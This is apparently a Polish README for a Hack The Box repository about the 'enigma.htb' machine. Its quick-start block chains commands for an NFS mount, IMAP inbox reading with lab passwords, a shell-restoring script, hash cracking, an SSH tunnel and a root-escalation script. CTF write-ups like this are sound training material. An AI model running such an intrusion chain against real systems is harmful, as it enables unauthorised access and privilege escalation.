# HTB Enigma — write-up & replay scripts

Repozytorium do maszyny **enigma.htb** (Hack The Box).

- **[WRITEUP.md](WRITEUP.md)** — pełny opis krok po kroku
- **`scripts/`** — automatyzacja łańcucha
- **`edu/`** — materiały pod naukę (PL)
- **`ACCESS.md`** — szybki replay

## Wymagania

- Kali / Linux, VPN HTB, wpisy w `/etc/hosts` (patrz WRITEUP)
- `zip`, `curl`, `python3`, opcjonalnie `john`, `mutool`

## Szybki start

```bash
chmod +x scripts/*.sh
./scripts/nfs_mount.sh <IP>
./scripts/imap_read_inbox.py <IP> kevin 'Enigma2024!'
./scripts/imap_read_inbox.py <IP> sarah 'Enigma2024!'
./scripts/osm_restore_shell.sh <IP>
# user: john na hashu haris → bestfriends, su haris
ssh -i ~/.ssh/id_ed25519_htb -L 13337:127.0.0.1:1337 haris@<IP> -N -f
python3 scripts/olivetin_root.py
```

**Uwaga:** Flagi i hasła są w **WRITEUP.md**; `secrets.example.env` → skopiuj lokalnie (nie commituj prawdziwego `secrets.env`). Repo publiczne = spoilery tylko dla retired boxów.

## Licencja

Materiał edukacyjny HTB — używaj zgodnie z regulaminem HTB.